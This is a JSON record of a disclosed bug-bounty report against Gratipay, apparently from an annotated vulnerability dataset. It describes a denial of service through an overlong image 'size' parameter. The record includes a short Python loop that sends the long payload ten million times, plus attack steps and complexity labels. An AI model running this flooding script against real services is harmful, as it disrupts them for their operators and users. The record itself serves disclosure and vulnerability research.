{
  "reported_to": "Gratipay",
  "reported_by": "edoverflow ",
  "title": "Application-level DoS on image's \"size\" parameter.",
  "content": "\n# Summary\nThe size parameter located on images is vulnerable to DoS. By modifying the parameter's value an attacker can cause the application to work very slowly.\n# Description\nThe issue is located in the get_image_url() function in gratipay/models/team/__init__.py and can be exploited by replacing the small or large values in the following GET request: http://<GRATIPAY INSTANCE>/<USER>/image?size=small.\nCode 206 Bytes\n1# Images\n2# ======\n3\n4IMAGE_SIZES = ('original', 'large', 'small')\n5\n6def get_image_url(self, size):\n7    assert size in ('original', 'large', 'small'), size\n8    return '/{}/image?size={}'.format(self.slug, size)\nLink: https://github.com/gratipay/gratipay.com/blob/1985e43033edd87bd16cdb46c16adbcda0bb6bc4/gratipay/models/team/__init__.py#L312-L314\n# How can this issue be exploited?\nRepeatedly sending values of 4094 characters in length will cause the DoS.\nCode 151 Bytes\n1import requests\n2payload = \"a\" * 4094\n3url = \"http://<GRATIPAY INSTANCE>/<USER>/image?size=small\" + payload\n4\n5for i in range(10000000):\n6\trequests.get(url)\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1509664560,
  "report_url": "https://hackerone.com/reports/247700",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Identify the target URL with the image size parameter, e.g., http://<GRATIPAY INSTANCE>/<USER>/image?size=small"
    ],
    [
      2,
      "Modify the size parameter to a very long string (e.g., 4094 characters) and repeatedly send requests to the endpoint"
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to perform a Denial of Service (DoS) attack by manipulating the 'size' parameter in image requests. By sending excessively long values for the 'size' parameter, the application's performance is degraded, leading to slow response times or unavailability.",
  "reason": "The attack is straightforward and does not involve multiple components, complex states, or novel logic. The vulnerability is easily identifiable by inspecting the URL parameter and testing with long input values.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}